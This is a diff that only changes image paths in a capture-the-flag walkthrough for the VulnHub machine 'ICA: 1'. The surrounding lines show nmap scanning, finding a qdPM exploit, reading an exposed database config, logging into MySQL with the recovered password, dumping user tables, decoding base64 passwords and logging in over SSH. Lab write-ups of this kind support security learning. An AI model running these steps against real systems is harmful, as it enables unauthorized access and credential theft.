@@ -3,7 +3,7 @@
 - **Machine:** ICA: 1
 - **Download:** https://www.vulnhub.com/entry/ica-1,748/
 
-![](811-1.png)
+![](images/811-1.png)
 
 ---
 
@@ -24,7 +24,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](811-2.png)
+![](images/811-2.png)
 
 ---
 
@@ -36,7 +36,7 @@ Run a comprehensive Nmap scan to identify open ports, services, OS information, 
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.239
 ```
 
-![](811-3.png)
+![](images/811-3.png)
 
 ---
 
@@ -60,7 +60,7 @@ Perform an aggressive scan using the `http-enum` NSE script.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.239
 ```
 
-![](811-4.png)
+![](images/811-4.png)
 
 ---
 
@@ -74,7 +74,7 @@ Visit the following endpoints.
 - http://192.168.2.239/core/
 - http://192.168.2.239/core/data/fixtures/fixtures.yml
 
-![](811-5.png)
+![](images/811-5.png)
 
 ---
 
@@ -84,7 +84,7 @@ Open the login page.
 
 - http://192.168.2.239/index.php/login
 
-![](811-6.png)
+![](images/811-6.png)
 
 The application is identified as **qdPM**.
 
@@ -94,7 +94,7 @@ Search for known exploits.
 searchsploit qdPM
 ```
 
-![](811-7.png)
+![](images/811-7.png)
 
 Read the exploit details.
 
@@ -102,7 +102,7 @@ Read the exploit details.
 cat /usr/share/exploitdb/exploits/php/webapps/50176.txt
 ```
 
-![](811-8.png)
+![](images/811-8.png)
 
 ---
 
@@ -112,7 +112,7 @@ Visit the database configuration file.
 
 - http://192.168.2.239/core/config/databases.yml
 
-![](811-9.png)
+![](images/811-9.png)
 
 Recovered database credentials:
 
@@ -131,7 +131,7 @@ Connect to the MySQL server.
 mysql --skip-ssl -h 192.168.2.239 -u qdpmadmin -pUcVQCMQk2STVeS6J
 ```
 
-![](811-10.png)
+![](images/811-10.png)
 
 Display available databases.
 
@@ -151,7 +151,7 @@ List available tables.
 SHOW TABLES;
 ```
 
-![](811-11.png)
+![](images/811-11.png)
 
 Enumerate data from interesting tables.
 
@@ -167,7 +167,7 @@ SELECT * FROM user;
 SELECT * FROM department;
 ```
 
-![](811-12.png)
+![](images/811-12.png)
 
 ---
 
@@ -197,7 +197,7 @@ echo 'REpjZVZ5OThXMjhZN3dMZw==' | base64 -d
 echo 'Y3FObkJXQ0J5UzJEdUpTeQ==' | base64 -d
 ```
 
-![](811-13.png)
+![](images/811-13.png)
 
 ---
 
@@ -211,7 +211,7 @@ Login as **dexter**.
 ssh dexter@192.168.2.239
 ```
 
-![](811-14.png)
+![](images/811-14.png)
 
 Login as **travis**.
 
@@ -219,7 +219,7 @@ Login as **travis**.
 ssh travis@192.168.2.239
 ```
 
-![](811-15.png)
+![](images/811-15.png)
 
 ---
 
